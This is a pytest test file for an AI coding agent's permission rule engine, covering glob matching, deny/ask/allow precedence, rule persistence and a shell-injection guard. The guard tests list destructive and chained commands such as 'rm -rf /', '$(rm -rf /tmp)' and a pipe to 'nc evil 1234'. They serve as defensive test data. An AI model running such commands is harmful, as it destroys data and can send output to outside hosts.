"""P3.1 — permission rule narrowing + persistence.

Three concerns under test:

  1. RuleEngine matcher semantics (exact, prefix, infix, suffix, edit/read
     aliases, mcp__-style names, comma-list, shell-injection guard).
  2. Evaluation order (deny → ask → allow; ask shadows ``always_allow``).
  3. ``.fred/settings.local.json`` round-trip and the ``/perms`` slash.

Persistence tests scope ``rules_start`` to ``tmp_path`` so the user's
real ``~/.fred/`` and the working-tree ``.fred/`` are never touched.
"""
from __future__ import annotations

import io
import json
from pathlib import Path

import pytest
from rich.console import Console

from fred.permissions import (
    PermissionPolicy,
    RuleEngine,
    add_rule,
    append_allow_rule,
    list_active_rules,
    load_permission_rules,
    remove_rule,
)
from fred.tools.registry import default_registry


# ---------------------------------------------------------------------------
# Helpers


def _captured_console() -> tuple[Console, io.StringIO]:
    buf = io.StringIO()
    return (
        Console(file=buf, force_terminal=False, width=120, color_system=None),
        buf,
    )


def _read_local(start: Path) -> dict:
    """Read .fred/settings.local.json from `start` (or empty dict)."""
    path = start / ".fred" / "settings.local.json"
    if not path.exists():
        return {}
    return json.loads(path.read_text("utf-8"))


# ---------------------------------------------------------------------------
# Matcher: parametrized over pattern shapes


@pytest.mark.parametrize(
    "rule,tool,args,expect",
    [
        # Exact match: bash, command verbatim.
        ("Bash(git status)", "bash", {"command": "git status"}, True),
        ("Bash(git status)", "bash", {"command": "git diff"}, False),
        # Prefix match: trailing ``*`` matches any suffix.
        ("Bash(npm run test *)", "bash", {"command": "npm run test --watch"}, True),
        ("Bash(npm run test *)", "bash", {"command": "npm run test"}, False),  # no space
        ("Bash(npm run test*)", "bash", {"command": "npm run test"}, True),    # tighter glob
        # Suffix match: leading ``*``.
        ("Bash(* --version)", "bash", {"command": "node --version"}, True),
        ("Bash(* --version)", "bash", {"command": "node --help"}, False),
        # Infix match: ``*`` on both sides.
        ("Bash(git * main)", "bash", {"command": "git checkout main"}, True),
        ("Bash(git * main)", "bash", {"command": "git checkout dev"}, False),
        # Read alias → matches view tool name with path glob.
        ("Read(.env)", "view", {"path": ".env"}, True),
        ("Read(.env)", "view", {"path": "src/main.py"}, False),
        # Edit alias → matches str_replace.
        ("Edit(*.py)", "str_replace", {"path": "src/api.py"}, True),
        ("Edit(*.py)", "str_replace", {"path": "src/api.ts"}, False),
        # Bare tool name with no specifier matches every call of the tool.
        ("Bash", "bash", {"command": "anything"}, True),
        ("Bash", "view", {"path": "x"}, False),
        # MCP tool naming (no parens) matches the bare tool name only.
        ("mcp__server__tool", "mcp__server__tool", {}, True),
        # Catch-all glob ``*`` matches every tool.
        ("*", "bash", {"command": "x"}, True),
        # Comma-separated lists: any sub-rule firing wins.
        (
            "Bash(git status), Edit(*.py)",
            "str_replace", {"path": "x.py"},
            True,
        ),
        (
            "Bash(git status), Edit(*.py)",
            "view", {"path": "x.py"},
            False,
        ),
    ],
)
def test_matcher_parametrized(rule, tool, args, expect):
    """Each row asserts whether `rule` matches `tool(args)` via RuleEngine."""
    engine = RuleEngine(allow=[rule])
    assert (engine.evaluate(tool, args) == "allow") is expect


# ---------------------------------------------------------------------------
# Evaluation order


class TestEvalOrder:
    def test_deny_wins_over_allow(self):
        engine = RuleEngine(
            deny=["Bash(rm -rf *)"],
            allow=["Bash(*)"],
        )
        assert engine.evaluate("bash", {"command": "rm -rf /tmp/junk"}) == "deny"
        assert engine.last_match == "Bash(rm -rf *)"

    def test_deny_wins_over_ask(self):
        engine = RuleEngine(
            deny=["Bash(rm -rf *)"],
            ask=["Bash(*)"],
        )
        assert engine.evaluate("bash", {"command": "rm -rf /etc"}) == "deny"

    def test_ask_wins_over_allow(self):
        engine = RuleEngine(
            ask=["Bash(git push *)"],
            allow=["Bash(*)"],
        )
        assert engine.evaluate("bash", {"command": "git push origin main"}) == "ask"
        assert engine.last_match == "Bash(git push *)"

    def test_no_match_returns_none(self):
        engine = RuleEngine(allow=["Bash(git status)"])
        assert engine.evaluate("bash", {"command": "ls -la"}) is None
        assert engine.last_match is None

    def test_ask_shadows_session_always_allow(self, monkeypatch, tmp_path):
        """An ``ask`` rule must override ``always_allow`` so a freshly
        added rule can re-quarantine a tool/specifier."""
        console, _ = _captured_console()
        engine = RuleEngine(ask=["Bash(rm *)"])
        policy = PermissionPolicy(
            yolo=False, console=console,
            rules=engine, rules_start=tmp_path,
        )
        # Pre-populate always_allow so the legacy path would have
        # short-circuited; the rule engine must still fire.
        policy.always_allow.add("bash")
        bash_tool = default_registry().get("bash")
        # User says "n" so the test doesn't depend on persistence.
        monkeypatch.setattr(
            "fred.permissions.Prompt.ask", lambda *a, **kw: "n"
        )
        ok = policy.check(bash_tool, {"command": "rm -rf /tmp/junk"})
        assert ok is False
        assert policy.last_outcome == "user_n"


# ---------------------------------------------------------------------------
# Shell-injection ban — the safety check the plan calls out


class TestShellInjectionGuard:
    @pytest.mark.parametrize(
        "command",
        [
            "git status; rm -rf /",
            "git status && rm -rf /",
            "git status || true",
            "git status | nc evil 1234",
            "git status & sleep 100",
            "git $(rm -rf /tmp) status",
            "git `whoami` status",
            "git status\nrm -rf /",
        ],
    )
    def test_allow_rule_does_not_authorize_chained_command(self, command):
        """An allow-rule glob must NEVER pass a shell metacharacter through."""
        engine = RuleEngine(allow=["Bash(git *)"])
        verdict = engine.evaluate("bash", {"command": command})
        # No allow; falls through to None so the Panel runs.
        assert verdict is None
        # last_match must NOT be set when the guard rejected the call.
        assert engine.last_match is None

    def test_deny_rule_still_matches_chained_command(self):
        """Deny-rules deliberately bypass the guard: a user can write
        ``Bash(git *)`` in `deny` to refuse every git-prefixed invocation
        regardless of how many statements are smuggled in."""
        engine = RuleEngine(deny=["Bash(git *)"])
        v = engine.evaluate("bash", {"command": "git status; rm -rf /"})
        assert v == "deny"
        assert engine.last_match == "Bash(git *)"

    def test_clean_command_still_authorized(self):
        engine = RuleEngine(allow=["Bash(git *)"])
        v = engine.evaluate("bash", {"command": "git status"})
        assert v == "allow"
        assert engine.last_match == "Bash(git *)"


# ---------------------------------------------------------------------------
# PermissionPolicy integration — rule_allow / rule_deny outcomes


class TestPolicyIntegration:
    def test_rule_allow_returns_true_with_outcome(self, monkeypatch, tmp_path):
        console, _ = _captured_console()
        engine = RuleEngine(allow=["Bash(git status)"])
        policy = PermissionPolicy(
            yolo=False, console=console,
            rules=engine, rules_start=tmp_path,
        )
        bash_tool = default_registry().get("bash")
        # Prompt.ask must NOT be called.
        monkeypatch.setattr(
            "fred.permissions.Prompt.ask",
            lambda *a, **kw: pytest.fail("Panel should not show on rule_allow"),
        )
        ok = policy.check(bash_tool, {"command": "git status"})
        assert ok is True
        assert policy.last_outcome == "rule_allow"
        assert policy.last_matched_rule == "Bash(git status)"

    def test_rule_deny_returns_false_with_outcome(self, monkeypatch, tmp_path):
        console, _ = _captured_console()
        engine = RuleEngine(deny=["Bash(rm -rf *)"])
        policy = PermissionPolicy(
            yolo=False, console=console,
            rules=engine, rules_start=tmp_path,
        )
        bash_tool = default_registry().get("bash")
        monkeypatch.setattr(
            "fred.permissions.Prompt.ask",
            lambda *a, **kw: pytest.fail("Panel should not show on rule_deny"),
        )
        ok = policy.check(bash_tool, {"command": "rm -rf /tmp"})
        assert ok is False
        assert policy.last_outcome == "rule_deny"
        assert policy.last_matched_rule == "Bash(rm -rf *)"

    def test_no_rule_falls_through_to_panel(self, monkeypatch, tmp_path):
        console, _ = _captured_console()
        engine = RuleEngine()  # empty
        policy = PermissionPolicy(
            yolo=False, console=console,
            rules=engine, rules_start=tmp_path,
        )
        bash_tool = default_registry().get("bash")
        monkeypatch.setattr(
            "fred.permissions.Prompt.ask", lambda *a, **kw: "y"
        )
        ok = policy.check(bash_tool, {"command": "ls -la"})
        assert ok is True
        # User-y is the legacy outcome — unchanged by the rules layer.
        assert policy.last_outcome == "user_y"
        assert policy.last_matched_rule is None


# ---------------------------------------------------------------------------
# Persistence: "always allow" pick at the Panel writes through


class TestAlwaysAllowPersistence:
    def test_panel_a_pick_appends_to_local_file(self, monkeypatch, tmp_path):
        console, _ = _captured_console()
        engine = RuleEngine()  # no rules → Panel runs
        policy = PermissionPolicy(
            yolo=False, console=console,
            rules=engine, rules_start=tmp_path,
        )
        bash_tool = default_registry().get("bash")

        monkeypatch.setattr(
            "fred.permissions.Prompt.ask", lambda *a, **kw: "a"
        )
        ok = policy.check(bash_tool, {"command": "echo hello"})
        assert ok is True
        assert policy.last_outcome == "user_a"

        data = _read_local(tmp_path)
        # The rule must land under permissions.allow with the canonical
        # ``Bash(<command>)`` shape, NOT a generic tool-name fallback.
        assert data["permissions"]["allow"] == ["Bash(echo hello)"]

        # Live engine should have grown by the same rule so a second
        # call goes through ``rule_allow`` rather than re-prompting.
        assert "Bash(echo hello)" in policy.rules.allow

    def test_second_a_pick_for_same_rule_is_deduped(self, monkeypatch, tmp_path):
        console, _ = _captured_console()
        engine = RuleEngine()
        policy = PermissionPolicy(
            yolo=False, console=console,
            rules=engine, rules_start=tmp_path,
        )
        bash_tool = default_registry().get("bash")
        monkeypatch.setattr(
            "fred.permissions.Prompt.ask", lambda *a, **kw: "a"
        )
        # First [a] writes to disk and into the live engine. The second
        # [a] for the same args is harmless: the rule already wins via
        # rule_allow, so the Panel won't actually fire — but if it did,
        # ``append_allow_rule`` would return None and we'd not duplicate.
        policy.check(bash_tool, {"command": "ls"})
        # Subsequent same-args check goes through the rule engine.
        policy.check(bash_tool, {"command": "ls"})

        data = _read_local(tmp_path)
        assert data["permissions"]["allow"] == ["Bash(ls)"]


# ---------------------------------------------------------------------------
# Persistence: load_permission_rules walks cwd → home


class TestLoaderWalk:
    def test_local_file_extends_project_file(self, tmp_path, monkeypatch):
        # Layer the project + local files in the same .fred/ dir; the
        # walker stops at the next .git boundary so we drop a sentinel
        # to keep the test tightly scoped.
        (tmp_path / ".git").mkdir()
        fred_dir = tmp_path / ".fred"
        fred_dir.mkdir()
        (fred_dir / "settings.json").write_text(json.dumps({
            "permissions": {
                "deny": ["Bash(rm -rf *)"],
                "allow": ["Bash(git *)"],
            },
        }))
        (fred_dir / "settings.local.json").write_text(json.dumps({
            "permissions": {
                "allow": ["Bash(npm *)"],
                "ask": ["Bash(git push *)"],
            },
        }))
        # Steer the user-global walk to a tmp HOME so this test doesn't
        # leak the runner's real ~/.fred/settings.json into the result.
        home = tmp_path / "home"
        home.mkdir()
        monkeypatch.setattr(Path, "home", classmethod(lambda cls: home))

        engine = load_permission_rules(start=tmp_path)
        assert engine.deny == ["Bash(rm -rf *)"]
        assert engine.allow == ["Bash(git *)", "Bash(npm *)"]
        assert engine.ask == ["Bash(git push *)"]


# ---------------------------------------------------------------------------
# add_rule / remove_rule round-trip


class TestAddRemove:
    def test_add_rule_appends_to_local(self, tmp_path):
        added = add_rule("Bash(git status)", "allow", start=tmp_path)
        assert added is True
        data = _read_local(tmp_path)
        assert data["permissions"]["allow"] == ["Bash(git status)"]

    def test_add_rule_is_dedup(self, tmp_path):
        add_rule("Bash(git status)", "allow", start=tmp_path)
        added2 = add_rule("Bash(git status)", "allow", start=tmp_path)
        assert added2 is False
        data = _read_local(tmp_path)
        assert data["permissions"]["allow"] == ["Bash(git status)"]

    def test_add_rule_rejects_unknown_list(self, tmp_path):
        with pytest.raises(ValueError):
            add_rule("Bash(git status)", "always", start=tmp_path)  # type: ignore[arg-type]

    def test_remove_rule_walks_all_lists(self, tmp_path):
        add_rule("Bash(git status)", "allow", start=tmp_path)
        add_rule("Bash(rm -rf *)", "deny", start=tmp_path)
        # Remove without specifying the list — walker finds it.
        assert remove_rule("Bash(rm -rf *)", start=tmp_path) is True
        data = _read_local(tmp_path)
        assert data["permissions"]["deny"] == []
        assert data["permissions"]["allow"] == ["Bash(git status)"]

    def test_remove_rule_returns_false_on_miss(self, tmp_path):
        add_rule("Bash(git status)", "allow", start=tmp_path)
        assert remove_rule("Bash(does not exist)", start=tmp_path) is False


# ---------------------------------------------------------------------------
# /perms slash — exercise the dispatcher behind the cli mocking pattern


class TestPermsSlashDispatcher:
    """Exercise the ``add``/``remove``/``list`` helpers the way the cli
    slash dispatcher does. The cli wires them directly to
    ``permissions.add_rule`` / ``remove_rule``, so testing the helpers
    with ``tmp_path`` validates the slash command's persistence behavior
    without spinning up the full REPL."""

    def test_list_active_rules_groups_by_list_name(self):
        engine = RuleEngine(
            deny=["Bash(rm -rf *)"],
            ask=["Bash(git push *)"],
            allow=["Bash(git status)"],
        )
        rows = list(list_active_rules(engine))
        # Order: deny → ask → allow (matches engine evaluation order).
        assert rows == [
            ("deny", "Bash(rm -rf *)"),
            ("ask", "Bash(git push *)"),
            ("allow", "Bash(git status)"),
        ]

    def test_add_then_list_then_remove(self, tmp_path):
        # Add via the same code path the slash uses.
        assert add_rule("Bash(git status)", "allow", start=tmp_path) is True
        assert add_rule("Bash(rm -rf *)", "deny", start=tmp_path) is True

        # Reload the engine the way the slash list-form does.
        engine = load_permission_rules(start=tmp_path)
        rows = list(list_active_rules(engine))
        assert ("deny", "Bash(rm -rf *)") in rows
        assert ("allow", "Bash(git status)") in rows

        # Remove and verify the file reflects it.
        assert remove_rule("Bash(rm -rf *)", start=tmp_path) is True
        engine2 = load_permission_rules(start=tmp_path)
        rows2 = list(list_active_rules(engine2))
        assert ("deny", "Bash(rm -rf *)") not in rows2
        assert ("allow", "Bash(git status)") in rows2

    def test_append_allow_rule_returns_canonical_string(self, tmp_path):
        # The Panel's [a] pick goes through append_allow_rule, which
        # both writes to disk AND returns the rule that was appended so
        # the live engine can mirror it. Explicit test for the contract.
        rule = append_allow_rule(
            "str_replace", {"path": "src/api.py", "old_str": "x", "new_str": "y"},
            start=tmp_path,
        )
        assert rule == "Str_replace(src/api.py)"
        # Idempotent: a second call returns None.
        assert append_allow_rule(
            "str_replace", {"path": "src/api.py"},
            start=tmp_path,
        ) is None


# ---------------------------------------------------------------------------
# Yolo + rules interaction


def test_yolo_skips_rule_engine(monkeypatch, tmp_path):
    """``--yolo`` short-circuits before the rule engine; even a deny-rule
    is bypassed. The README+plan-doc commitment is that yolo is the
    "nothing matters" escape hatch."""
    console, _ = _captured_console()
    engine = RuleEngine(deny=["Bash(*)"])
    policy = PermissionPolicy(
        yolo=True, console=console,
        rules=engine, rules_start=tmp_path,
    )
    bash_tool = default_registry().get("bash")
    monkeypatch.setattr(
        "fred.permissions.Prompt.ask",
        lambda *a, **kw: pytest.fail("Panel should not show in yolo mode"),
    )
    ok = policy.check(bash_tool, {"command": "rm -rf /"})
    assert ok is True
    assert policy.last_outcome == "yolo"
    assert policy.last_matched_rule is None
